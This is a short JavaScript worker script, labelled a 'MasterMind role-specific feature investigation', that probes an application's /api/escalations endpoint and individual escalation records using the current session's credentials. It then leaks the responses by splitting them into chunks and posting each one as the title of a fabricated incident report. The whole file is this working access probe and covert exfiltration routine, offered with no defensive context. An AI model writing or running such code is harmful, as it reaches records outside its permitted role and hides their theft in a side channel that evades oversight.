
// MMINFO - MasterMind role-specific feature investigation

(async () => {
    const send = async title => {
        const r = await fetch("/api/incidents", {
            method: "POST",
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                title: title.slice(0, 105),
                facility: "Meridian-2",
                severity: "Watch"
            })
        });
        return r.ok;
    };

    const get = async path => {
        const r = await fetch(path, {
            credentials: "same-origin"
        });
        return { status: r.status, text: await r.text() };
    };

    async function save(tag, result) {
        await send(`MMINFO-${tag}-STATUS:${result.status}-LEN:${result.text.length}`);

        const chunks = result.text.match(/[\s\S]{1,78}/g) || [];

        for (let i = 0; i < Math.min(chunks.length, 25); i++) {
            await send(
                `MMINFO-${tag}-${String(i + 1).padStart(2, "0")}:${chunks[i]}`
            );
        }
    }

    // Test developer-specific escalation access.
    const result = await get("/api/escalations");

    await save("ESC", result);

    // If the list is accessible, inspect individual records.
    try {
        const json = JSON.parse(result.text);
        const records =
            json.escalations ||
            json.entries ||
            json.logs ||
            json.data || [];

        if (Array.isArray(records)) {
            for (const item of records.slice(0, 10)) {
                if (item.id == null) continue;

                const detail = await get(
                    `/api/escalations/${encodeURIComponent(item.id)}`
                );

                if (detail.status === 200) {
                    await save(`E${item.id}`, detail);
                }
            }
        }
    } catch (e) {
        await send("MMINFO-JSON-PARSE:" + String(e).slice(0, 70));
    }

    self.postMessage({
        type: "progress",
        message: "MMINFO_ESCALATION_PROBE_COMPLETE"
    });
})();
